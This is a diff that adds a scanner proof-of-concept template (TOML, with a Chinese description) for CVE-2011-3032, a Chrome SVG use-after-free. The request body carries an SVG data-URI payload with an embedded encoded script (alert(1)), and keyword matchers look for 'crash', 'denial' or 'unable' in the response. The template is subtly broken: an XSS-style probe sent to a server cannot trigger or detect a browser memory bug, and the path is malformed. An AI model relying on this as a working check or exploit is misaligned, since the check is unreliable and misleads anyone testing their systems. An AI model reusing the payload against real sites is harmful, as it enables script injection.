@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "Google Chrome 17.0.963.65 之前版本在处理 SVG 值时存在释放后使用漏洞，通过构造恶意 SVG 内容可触发浏览器崩溃拒绝服务"
+id = "POC-AVE-2011-0176"
+name = "CVE-2011-3032 PoC"
+severity = "medium"
+tags = ["ave-2011-0176"]
+vuln_id = [
+    "CVE-2011-3032",
+    "AVE-2011-0176",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """<!DOCTYPE html><html><body><svg><image href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E"/></svg></body></html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "crash",
+    "denial",
+    "unable",
+]
